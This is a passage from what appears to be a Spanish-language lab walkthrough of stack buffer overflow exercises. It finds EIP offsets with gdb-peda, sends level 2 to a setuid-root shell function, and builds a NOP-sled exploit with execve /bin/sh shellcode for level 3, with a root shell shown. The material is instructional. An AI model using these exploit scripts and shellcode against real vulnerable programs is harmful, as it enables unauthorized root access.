    <p>En este caso vemos que en el código se esta definiendo el <code class="language-plaintext highlighter-rouge">uid</code> al propietario del binario ósea <code class="language-plaintext highlighter-rouge">level2</code> ya que este es el segundo binario el <code class="language-plaintext highlighter-rouge">uid</code> funciona para almacenar identificadores de usuario, es el identificador de usuario en Linux y antes del return podemos ver que esta llamando a una función llamada <code class="language-plaintext highlighter-rouge">hello</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/2.png" />
</p>

<ul>
  <li>En esta imagen vemos el código de la función <code class="language-plaintext highlighter-rouge">hello</code> que se esta usando en el código.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/3.png" />
</p>

<ul>
  <li>
    <p>Vemos que se define un tamaño de 28 bytes y usa <code class="language-plaintext highlighter-rouge">strcpy</code> que copea el argumento que le pasas.</p>
  </li>
  <li>
    <p>Si inspeccionamos la funciona <code class="language-plaintext highlighter-rouge">spawn</code> tenemos que pasarle 3 argumentos para que nos de una <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/4.png" />
</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">spawn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//privilegios de super usuario</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// Argumentos para /bin/sh</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// No se pasan variables de entorno</span>
  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span> <span class="c1">// se interpreta la bash</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Para empezar vamos a usar <code class="language-plaintext highlighter-rouge">gdb</code> que es un <code class="language-plaintext highlighter-rouge">debugger</code> y lo usaremos junto con peda <a href="https://github.com/longld/peda">https://github.com/longld/peda</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelTwo
Reading symbols from levelTwo...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelTwo<span class="o">)</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>En el código vimos que se esta definiendo que son 28 bytes de buffer a si que vamos a enviar 100 bytes para ver si se corrompe el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_arg 100
Set 1 arguments to program
</code></pre></div></div>

<ul>
  <li>Ahora lo corremos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelTwo <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Hello AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x6b <span class="o">(</span><span class="s1">'k'</span><span class="o">)</span>
EBX: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
ECX: 0xffffcf0c <span class="nt">--</span><span class="o">&gt;</span> 0x2e6b3000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
EDX: 0x1
ESI: 0xffffcfe0 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x41412941 <span class="o">(</span><span class="s1">'A)AA'</span><span class="o">)</span>
ESP: 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
EIP: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x61414145
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0004| 0xffffcf94 <span class="o">(</span><span class="s2">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0008| 0xffffcf98 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0012| 0xffffcf9c <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0016| 0xffffcfa0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0020| 0xffffcfa4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0024| 0xffffcfa8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0028| 0xffffcfac <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo que tenemos que hacer es buscar el <code class="language-plaintext highlighter-rouge">offset</code> que es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code> que es la dirección de memoria de la próxima instrucción a ejecutar, el objetivo es manipular el valor del registro <code class="language-plaintext highlighter-rouge">EIP</code> para que apunte a una dirección de memoria controlada por nosotros.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x61414145
1631666501 found at offset: 36
</code></pre></div></div>

<ul>
  <li>Ahora vimos que en el código hay una función <code class="language-plaintext highlighter-rouge">spawn</code> y necesitamos saber su dirección a si que vamos a buscarla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info <span class="k">function</span> ^spawn<span class="err">$</span>
All functions matching regular expression <span class="s2">"^spawn$"</span>:

Non-debugging symbols:
0x565561e9  spawn
</code></pre></div></div>

<ul>
  <li>Y bueno ya tenemos la dirección pero como estamos en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta ala dirección.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x565561e9      |    <span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>61<span class="se">\x</span>e9    | <span class="se">\x</span>e9<span class="se">\x</span>61<span class="se">\x</span>55<span class="se">\x</span>56
</code></pre></div></div>

<ul>
  <li>Ahora como ya tenemos todo listo podemos seguir con el script para que todo esto funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptTwo.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 36 <span class="c"># pattern_offset 0x61414145</span>

null <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset <span class="c"># vamos a pasarle eso para asta llegar al EIP</span>

spawn <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56"</span> <span class="c"># Le pasamos la direccion para que el EIP apunte a ala funcion spawn</span>

print<span class="o">(</span>null + spawn<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelTwo <span class="si">$(</span>python2 scriptTwo.py<span class="si">)</span>
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�UV
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<h2 id="level-3">Level 3</h2>

<blockquote>
  <p>Stack Based.</p>
</blockquote>

<ul>
  <li>
    <p>Vamos a observar el código.</p>
  </li>
  <li>
    <p>Después de analizar con <code class="language-plaintext highlighter-rouge">ghidra</code> esta es la funciona <code class="language-plaintext highlighter-rouge">main</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main.png" />
</p>

<ul>
  <li>Esta haciendo casi lo mismo pero ahora llama a la funciona <code class="language-plaintext highlighter-rouge">overflow</code>.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main2.png" />
</p>

<ul>
  <li>Ahora define un buffer de <code class="language-plaintext highlighter-rouge">260 bytes</code> y copea el argumento con la función <code class="language-plaintext highlighter-rouge">strcpy</code> que habíamos visto de antes en los binarios anterior, si <code class="language-plaintext highlighter-rouge">param_1</code> contiene más de <code class="language-plaintext highlighter-rouge">260</code> caracteres, los datos adicionales se escribirán en la memoria adyacente a <code class="language-plaintext highlighter-rouge">local_10c</code>, lo que puede provocar un desbordamiento de búfer.</li>
</ul>

<pre><code class="language-C">void overflow(char *param_1)

{
  char local_10c [260];
  
  strcpy(local_10c,param_1);
  printf("Buf: %s\n",local_10c);
  return;
}
</code></pre>

<ul>
  <li>Vamos a volver a usar <code class="language-plaintext highlighter-rouge">gdb</code> para corromper el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelThree
Reading symbols from levelThree...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelThree<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 300
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x132
EBX: 0x25413225 <span class="o">(</span><span class="s1">'%2A%'</span><span class="o">)</span>
ECX: 0xffffd0bc <span class="nt">--</span><span class="o">&gt;</span> 0x13ecbc00
EDX: 0x1
ESI: 0xffffd270 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x64254148 <span class="o">(</span><span class="s1">'HA%d'</span><span class="o">)</span>
ESP: 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
EIP: 0x41332541 <span class="o">(</span><span class="s1">'A%3A'</span><span class="o">)</span>
EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41332541
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0004| 0xffffd224 <span class="o">(</span><span class="s2">"eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0008| 0xffffd228 <span class="o">(</span><span class="s2">"A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0012| 0xffffd22c <span class="o">(</span><span class="s2">"%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0016| 0xffffd230 <span class="o">(</span><span class="s2">"5A%KA%gA%6A%"</span><span class="o">)</span>
0020| 0xffffd234 <span class="o">(</span><span class="s2">"A%gA%6A%"</span><span class="o">)</span>
0024| 0xffffd238 <span class="o">(</span><span class="s2">"%6A%"</span><span class="o">)</span>
0028| 0xffffd23c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41332541
1093870913 found at offset: 268
</code></pre></div></div>

<ul>
  <li>Necesitamos 268 bytes para sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code> como no hay una función que nos otorgue una <code class="language-plaintext highlighter-rouge">bash</code> vamos a definir un <code class="language-plaintext highlighter-rouge">shellcode</code> podemos usar el siguiente <a href="https://www.exploit-db.com/shellcodes/13628">https://www.exploit-db.com/shellcodes/13628</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 268

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">NOP</code> que no realiza ninguna acción solo es para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del <code class="language-plaintext highlighter-rouge">shellcode</code> por que no podemos pasarnos de <code class="language-plaintext highlighter-rouge">268 bytes</code> para no sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptThree.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268 <span class="c">#En el shellcode son las intrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span> <span class="c">#x90", representa la instrucción "NOP" en lenguaje de máquina</span>
eip <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c">#eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora para probar vamos con <code class="language-plaintext highlighter-rouge">gdb</code> pasando el <code class="language-plaintext highlighter-rouge">script</code> como argumento.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: j
      XRh//shh/bin��BBBB

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x116
EBX: 0xe3896e69
ECX: 0xffffd0dc <span class="nt">--</span><span class="o">&gt;</span> 0xe67ff500
EDX: 0x1
ESI: 0xffffd290 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x80cdc931
ESP: 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
0004| 0xffffd244 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0008| 0xffffd248 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0012| 0xffffd24c <span class="o">(</span><span class="s2">"7bUV"</span><span class="o">)</span>
0016| 0xffffd250 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0020| 0xffffd254 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffd258 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffd25c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como pudimos ver <code class="language-plaintext highlighter-rouge">EIP</code> contiene <code class="language-plaintext highlighter-rouge">BBBB</code> que era lo que definimos que haga en el script.</p>
  </li>
  <li>
    <p>Vamos a buscar en la pila alguna dirección que contenga los <code class="language-plaintext highlighter-rouge">nops</code> que están antes del <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/pila.png" />
</p>

<ul>
  <li>El comando funciona para inspeccionar la memoria vamos a examinar 300 unidades <code class="language-plaintext highlighter-rouge">w</code> quiere decir que cada unidad que se examina es una palabra y <code class="language-plaintext highlighter-rouge">x</code> indica que el formato de salida debe ser <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</li>
</ul>

<blockquote>
  <p>$esp es el registro del stack pointer en arquitecturas x86. Este registro apunta a la cima de la pila en la memoria. En el contexto de un programa que ejecuta un exploit de desbordamiento de buffer, $esp te dirá dónde está actualmente la “cima” de la pila, lo cual es crítico para entender cómo tus datos (o payload) están organizados en la memoria.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/300wx <span class="nv">$esp</span>
0xffffd240:	0xffffd400	0x00000000	0x00000000	0x56556237
0xffffd250:	0x00000000	0x00000000	0x00000013	0x00000000
0xffffd260:	0xf7c216ac	0xf7fd9e61	0xf7c1c9a2	0xffffd290
0xffffd270:	0xf7e1dff4	0x56556280	0x00000000	0xf7c237c5
0xffffd280:	0x00000001	0x00000000	0x00000078	0xf7c237c5
0xffffd290:	0x00000002	0xffffd344	0xffffd350	0xffffd2b0
0xffffd2a0:	0xf7e1dff4	0x56556212	0x00000002	0xffffd344
0xffffd2b0:	0xf7e1dff4	0x56556280	0xf7ffcba0	0x00000000
0xffffd2c0:	0x8a0cc8d7	0xf1c6e2c7	0x00000000	0x00000000
0xffffd2d0:	0x00000000	0xf7ffcba0	0x00000000	0xd1348400
0xffffd2e0:	0xf7ffda30	0xf7c23756	0xf7e1dff4	0xf7c23888
0xffffd2f0:	0xf7fcaac4	0x56559000	0x00000002	0x56556090
0xffffd300:	0x00000000	0xf7fdbe80	0xf7c23809	0x56559000
0xffffd310:	0x00000002	0x56556090	0x00000000	0x565560c1
0xffffd320:	0x56556212	0x00000002	0xffffd344	0x56556280
0xffffd330:	0x565562e0	0xf7fceca0	0xffffd33c	0xf7ffda30
0xffffd340:	0x00000002	0xffffd4bc	0xffffd4e9	0x00000000
0xffffd350:	0xffffd5fa	0xffffd60e	0xffffd619	0xffffd626
0xffffd360:	0xffffd684	0xffffd693	0xffffd6b7	0xffffd6ce
0xffffd370:	0xffffdde7	0xffffddfb	0xffffde08	0xffffde12
0xffffd380:	0xffffde1d	0xffffde30	0xffffde49	0xffffde58
0xffffd390:	0xffffde63	0xffffde6e	0xffffde91	0xffffdeac
0xffffd3a0:	0xffffdeca	0xffffdee8	0xffffdef0	0xffffdf16
0xffffd3b0:	0xffffdf3f	0xffffdf54	0xffffdf5f	0xffffdf67
0xffffd3c0:	0xffffdf87	0xffffdfb6	0xffffdfbf	0x00000000
0xffffd3d0:	0x00000020	0xf7fc8570	0x00000021	0xf7fc8000
0xffffd3e0:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
0xffffd3f0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd400:	0x00000003	0x56555034	0x00000004	0x00000020
0xffffd410:	0x00000005	0x0000000b	0x00000007	0xf7fca000
0xffffd420:	0x00000008	0x00000000	0x00000009	0x56556090
0xffffd430:	0x0000000b	0x00000000	0x0000000c	0x00000000
0xffffd440:	0x0000000d	0x00000000	0x0000000e	0x00000000
0xffffd450:	0x00000017	0x00000000	0x00000019	0xffffd49b
0xffffd460:	0x0000001a	0x00000002	0x0000001f	0xffffdfcb
0xffffd470:	0x0000000f	0xffffd4ab	0x0000001b	0x0000001c
0xffffd480:	0x0000001c	0x00000020	0x00000000	0x00000000
0xffffd490:	0x00000000	0x00000000	0x29000000	0xf4d13484
0xffffd4a0:	0xe3943ad4	0xa212ba18	0x6939ccce	0x00363836
0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
0xffffd4c0:	0x696d2f65	0x6c657567	0x6174532f	0x764f6b63
0xffffd4d0:	0x6c667265	0x6c2f776f	0x6c657665	0x656c2f73
0xffffd4e0:	0x546c6576	0x65657268	0x90909000	0x90909090
0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5e0:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
0xffffd5f0:	0xcdc931e3	0x42424280	0x4f430042	0x54524f4c
0xffffd600:	0x3d4d5245	0x65757274	0x6f6c6f63	0x49440072
0xffffd610:	0x414c5053	0x303a3d59	0x4e414c00	0x2e433d47
0xffffd620:	0x2d465455	0x41500038	0x2f3d4854	0x2f727375
0xffffd630:	0x61636f6c	0x62732f6c	0x2f3a6e69	0x2f727375
